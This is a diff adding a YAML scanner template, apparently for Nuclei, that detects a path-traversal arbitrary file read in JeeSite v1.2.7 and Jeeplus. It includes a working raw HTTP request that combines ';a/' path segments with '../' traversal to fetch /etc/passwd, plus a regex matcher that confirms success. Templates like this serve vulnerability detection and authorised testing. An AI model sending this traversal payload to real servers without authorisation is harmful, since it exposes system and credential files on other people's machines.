@@ -1,0 +1,26 @@
+id: jeesite-userfiles-fileread
+
+info:
+  name: JeeSite v1.2.7 Userfiles - File Read
+  author: qwtd
+  severity: high
+  description: |
+    JeeSite v1.2.7 && Jeeplus ani Userfiles allows remote attackers to read arbitrary files via a .. (dot dot) in the path parameter.
+  reference:
+    - https://mp.weixin.qq.com/s/juMoy2BHmepw65o4T6XejQ
+  tags: JeeSite,Jeeplus
+
+http:
+  - raw:
+      - |
+        GET /userfiles;a/a/a/a/a/a/a/a/a/a/a/a/userfiles/../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
